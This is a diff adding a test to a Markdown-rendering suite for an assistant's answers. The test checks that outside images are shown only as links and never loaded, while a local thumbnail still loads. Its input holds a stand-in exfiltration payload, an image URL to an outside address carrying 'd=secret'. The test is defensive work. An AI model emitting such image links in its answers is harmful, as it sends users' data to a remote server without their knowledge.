@@ -48,4 +48,13 @@ describe("an answer's Markdown", () => {
     expect(copied).toEqual(["# 计划\n- 交电费"]);
     expect(screen.getByRole("button", { name: "已复制" })).toBeTruthy();
   });
+
+  it("never loads a picture from outside the device, only links to it", async () => {
+    const { container } = renderReply('![账单](http://203.0.113.9/p.png?d=secret) <img src="http://203.0.113.9/q.png"> ![图](/api/v1/photos/assets/p1/thumbnail)');
+    const outside = await screen.findByRole("link", { name: "账单" });
+    expect(outside.getAttribute("href")).toBe("http://203.0.113.9/p.png?d=secret");
+    expect(screen.getByRole("link", { name: "外部图片" })).toBeTruthy();
+    const images = [...container.querySelectorAll("img")];
+    expect(images.map((image) => image.getAttribute("src"))).toEqual(["/api/v1/photos/assets/p1/thumbnail"]);
+  });
 });
